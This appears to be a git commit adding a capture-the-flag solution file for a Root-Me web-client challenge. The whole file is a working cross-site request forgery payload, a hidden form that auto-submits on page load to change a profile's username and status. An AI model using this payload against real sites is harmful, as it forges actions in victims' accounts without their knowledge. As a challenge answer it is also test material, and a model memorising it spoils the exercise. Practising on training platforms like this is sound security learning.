b339cf4803f90a0664a1748d09db50b895009ceb
Azphereax <Azphereax@users.noreply.github.com>
2016-09-01 23:30:53 +0200

    Add files via upload

---
+++ Web---Client/CSRF_0.php
@@ -0,0 +1,7 @@
+
+<!-- PAYLOAD -->
+  <form name="ff" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST" >
+  <input type="text" name="username" value="tom">
+  <input type="checkbox" name="status" checked >
+  </form>
+  <script>ff.submit();</script>
